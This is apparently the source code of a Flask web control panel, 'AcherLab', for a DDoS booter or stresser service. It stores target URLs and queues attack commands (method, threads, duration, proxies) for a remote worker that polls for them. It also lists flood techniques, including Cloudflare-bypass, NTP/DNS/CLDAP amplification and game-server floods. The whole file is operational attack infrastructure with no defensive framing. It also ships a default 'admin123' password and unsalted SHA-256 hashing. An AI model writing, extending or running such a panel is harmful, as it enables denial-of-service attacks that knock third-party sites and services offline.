import os, json, time, threading, secrets, hashlib, hmac
from datetime import datetime
from functools import wraps
from flask import Flask, render_template, request, jsonify, session, redirect

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))

DATA_DIR = os.path.join(os.path.dirname(__file__), "data")
USERS_FILE = os.path.join(DATA_DIR, "users.json")
TARGETS_FILE = os.path.join(DATA_DIR, "targets.json")
CONFIG_FILE = os.path.join(DATA_DIR, "config.json")
WORKER_FILE = os.path.join(DATA_DIR, "worker.json")

os.makedirs(DATA_DIR, exist_ok=True)

worker_status = {"online": False, "last_seen": None, "version": None, "cpu_info": None}
worker_stats = {"requests": 0, "success": 0, "rate": 0, "cpu": 0, "memory": 0, "running": False, "uptime": "00:00:00"}
worker_logs = []
pending_command = None
command_lock = threading.Lock()

LAYER7_METHODS = [
    "GET", "POST", "OVH", "RHEX", "STOMP", "STRESS", "DYN", "DOWNLOADER",
    "SLOW", "HEAD", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB",
    "BOT", "APACHE", "XMLRPC", "CFB", "CFBUAM", "BYPASS", "BOMB", "KILLER", "TOR"
]
LAYER4_METHODS = [
    "TCP", "UDP", "SYN", "CPS", "CONNECTION", "VSE", "TS3", "FIVEM", "FIVEM-TOKEN",
    "MINECRAFT", "MCBOT", "MCPE", "MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"
]

def hash_pw(pw):
    return hashlib.sha256(pw.encode()).hexdigest()

def init_data():
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, "w") as f:
            json.dump({"admin": {"password": hash_pw("admin123"), "changed": False}}, f)
    if not os.path.exists(TARGETS_FILE):
        with open(TARGETS_FILE, "w") as f:
            json.dump([], f)
    if not os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "w") as f:
            json.dump({"server_name": "AcherLab", "max_duration": 86400}, f)
    if not os.path.exists(WORKER_FILE):
        with open(WORKER_FILE, "w") as f:
            json.dump({"token": secrets.token_hex(32), "server_url": ""}, f)

def load_json(path):
    try:
        with open(path) as f:
            return json.load(f)
    except:
        return {}

def save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=2)

def login_required(f):
    @wraps(f)
    def wrapper(*a, **kw):
        if not session.get("logged_in"):
            if request.path.startswith("/api/"):
                return jsonify({"error": "Not authenticated"}), 401
            return redirect("/login")
        if not session.get("pw_changed"):
            if request.path.startswith("/api/"):
                return jsonify({"error": "Password not changed"}), 403
            if request.path not in ("/change-password",):
                return redirect("/change-password")
        return f(*a, **kw)
    return wrapper

def worker_auth_required(f):
    @wraps(f)
    def wrapper(*a, **kw):
        auth = request.headers.get("Authorization", "")
        config = load_json(WORKER_FILE)
        expected = config.get("token", "")
        if not auth.startswith("Bearer ") or not hmac.compare_digest(auth[7:], expected):
            return jsonify({"error": "Unauthorized"}), 401
        return f(*a, **kw)
    return wrapper

init_data()

@app.route("/")
@login_required
def index():
    return render_template("index.html", methods=LAYER7_METHODS + LAYER4_METHODS)

@app.route("/login")
def login_page():
    if session.get("logged_in"):
        if not session.get("pw_changed"):
            return redirect("/change-password")
        return redirect("/")
    return render_template("login.html")

@app.route("/change-password")
def change_pw_page():
    if not session.get("logged_in"):
        return redirect("/login")
    return render_template("change-password.html")

@app.route("/api/login", methods=["POST"])
def api_login():
    data = request.json
    username = data.get("username", "").strip()
    password = data.get("password", "").strip()
    users = load_json(USERS_FILE)
    if username not in users or users[username]["password"] != hash_pw(password):
        return jsonify({"error": "Invalid credentials"}), 401
    session["logged_in"] = True
    session["username"] = username
    session["pw_changed"] = users[username]["changed"]
    return jsonify({"message": "OK", "pw_changed": users[username]["changed"]})

@app.route("/api/change-password", methods=["POST"])
def api_change_password():
    if not session.get("logged_in"):
        return jsonify({"error": "Not logged in"}), 401
    data = request.json
    old = data.get("old_password", "")
    new = data.get("new_password", "")
    if len(new) < 4:
        return jsonify({"error": "Password must be at least 4 characters"}), 400
    username = session["username"]
    users = load_json(USERS_FILE)
    if users[username]["password"] != hash_pw(old):
        return jsonify({"error": "Current password is incorrect"}), 401
    users[username]["password"] = hash_pw(new)
    users[username]["changed"] = True
    save_json(USERS_FILE, users)
    session["pw_changed"] = True
    return jsonify({"message": "Password changed successfully"})

@app.route("/api/check-auth")
def api_check_auth():
    return jsonify({"logged_in": session.get("logged_in", False), "pw_changed": session.get("pw_changed", False)})

@app.route("/api/logout", methods=["POST"])
def api_logout():
    session.clear()
    return jsonify({"message": "Logged out"})

@app.route("/api/system")
@login_required
def api_system():
    return jsonify({
        "worker": worker_status,
        "stats": worker_stats,
        "logs": worker_logs[-100:],
        "methods": {"layer7": LAYER7_METHODS, "layer4": LAYER4_METHODS}
    })

@app.route("/api/targets", methods=["GET"])
@login_required
def api_get_targets():
    targets = load_json(TARGETS_FILE)
    return jsonify(targets)

@app.route("/api/targets", methods=["POST"])
@login_required
def api_save_target():
    targets = load_json(TARGETS_FILE)
    data = request.json
    if not data.get("url"):
        return jsonify({"error": "URL required"}), 400
    now = datetime.now().isoformat()
    existing = next((t for t in targets if t["url"] == data["url"]), None)
    if existing:
        existing["name"] = data.get("name", existing["name"])
        existing["updated"] = now
    else:
        targets.append({
            "id": secrets.token_hex(8),
            "name": data.get("name", data["url"]),
            "url": data["url"],
            "created": now,
            "updated": now
        })
    save_json(TARGETS_FILE, targets)
    return jsonify({"message": "Saved", "targets": targets})

@app.route("/api/targets/<target_id>", methods=["DELETE"])
@login_required
def api_delete_target(target_id):
    targets = load_json(TARGETS_FILE)
    targets = [t for t in targets if t["id"] != target_id]
    save_json(TARGETS_FILE, targets)
    return jsonify({"message": "Deleted"})

@app.route("/api/attack/start", methods=["POST"])
@login_required
def api_attack_start():
    global pending_command
    if not worker_status.get("online"):
        return jsonify({"error": "Worker offline"}), 503
    if worker_stats.get("running"):
        return jsonify({"error": "Attack already running"}), 400
    data = request.json
    target = data.get("url", "").strip()
    if not target:
        return jsonify({"error": "URL required"}), 400
    method = data.get("method", "GET").upper()
    threads = data.get("threads", 100)
    duration = data.get("duration", 60)
    proxy_type = data.get("proxy_type", 0)
    rpc = data.get("rpc", 10)
    cmd = {
        "action": "start",
        "method": method,
        "target": target,
        "threads": threads,
        "duration": duration,
        "proxy_type": proxy_type,
        "rpc": rpc,
        "cmd_at": datetime.now().isoformat()
    }
    with command_lock:
        pending_command = cmd
    return jsonify({"message": f"Command sent: {method}", "command": cmd})

@app.route("/api/attack/stop", methods=["POST"])
@login_required
def api_attack_stop():
    global pending_command
    with command_lock:
        pending_command = {"action": "stop", "cmd_at": datetime.now().isoformat()}
    return jsonify({"message": "Stop command sent"})

@app.route("/api/worker/command", methods=["GET"])
@worker_auth_required
def api_worker_get_command():
    global pending_command
    if not worker_status.get("online"):
        worker_status["online"] = True
    worker_status["last_seen"] = datetime.now().isoformat()
    with command_lock:
        cmd = pending_command
        pending_command = None
    return jsonify({"command": cmd})

@app.route("/api/worker/stats", methods=["POST"])
@worker_auth_required
def api_worker_post_stats():
    global worker_stats, worker_status, worker_logs
    data = request.json
    worker_status["online"] = True
    worker_status["last_seen"] = datetime.now().isoformat()
    if data.get("cpu_info"):
        worker_status["cpu_info"] = data["cpu_info"]
    if data.get("version"):
        worker_status["version"] = data["version"]
    if data.get("stats"):
        worker_stats.update(data["stats"])
    if data.get("logs"):
        for line in data["logs"]:
            worker_logs.append({"time": datetime.now().strftime("%H:%M:%S"), "text": line})
        if len(worker_logs) > 2000:
            worker_logs[:] = worker_logs[-2000:]
    return jsonify({"ok": True})

@app.route("/api/worker/config", methods=["GET"])
@worker_auth_required
def api_worker_get_config():
    cfg = load_json(CONFIG_FILE)
    return jsonify(cfg)

@app.route("/api/config", methods=["GET"])
@login_required
def api_get_config():
    cfg = load_json(CONFIG_FILE)
    return jsonify(cfg)

@app.route("/api/config", methods=["POST"])
@login_required
def api_update_config():
    cfg = load_json(CONFIG_FILE)
    data = request.json
    cfg["server_name"] = data.get("server_name", cfg.get("server_name", "AcherLab"))
    cfg["max_duration"] = data.get("max_duration", cfg.get("max_duration", 86400))
    save_json(CONFIG_FILE, cfg)
    return jsonify({"message": "Config updated"})

@app.route("/api/worker/info", methods=["GET"])
@worker_auth_required
def api_worker_info():
    cfg = load_json(WORKER_FILE)
    return jsonify({"token": cfg.get("token"), "server_url": cfg.get("server_url")})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
